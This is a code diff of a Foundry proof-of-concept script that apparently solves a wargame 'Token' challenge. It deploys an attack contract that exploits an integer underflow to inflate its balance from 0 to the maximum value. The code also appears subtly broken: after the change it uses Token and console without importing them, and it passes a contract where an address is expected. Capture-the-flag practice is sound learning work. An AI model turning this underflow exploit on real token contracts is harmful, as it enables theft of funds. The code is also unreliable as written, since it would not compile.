@@ -1,18 +1,23 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity 0.8.24;
 
-import "forge-std/Script.sol";
-import "../instances/Ilevel05.sol";
+import {Script} from "forge-std/Script.sol";
+import {UnsafeMath} from "../challenges/5_Token.sol";
 
 contract POC is Script {
-    Token level5 = Token(0x64db54633180E5C63Ca63393324a8E0843dFa485);
+    Token token = Token(0x813D92e2FCc7E453E161DDDFDE259369b6bF4294);
 
     function run() external {
-        vm.startBroadcast();
-        
-        console.log("Current balance is :", level5.balanceOf(msg.sender));
-        level5.transfer(0xD6aE8250b8348C94847280928c79fb3b63cA453e, 21);
-        console.log("New balance is :", level5.balanceOf(msg.sender));
+        uint256 deployer = vm.envUint("PRIVATE_KEY");
+
+        vm.startBroadcast(deployer);
+
+        UnsafeMath unsafe = new UnsafeMath();
+        console.log("Balance before: ", token.balanceOf(unsafe)); // 0
+
+        unsafe.attack();
+
+        console.log("Balance after: ", token.balanceOf(unsafe)); // max uint256
 
         vm.stopBroadcast();
     }
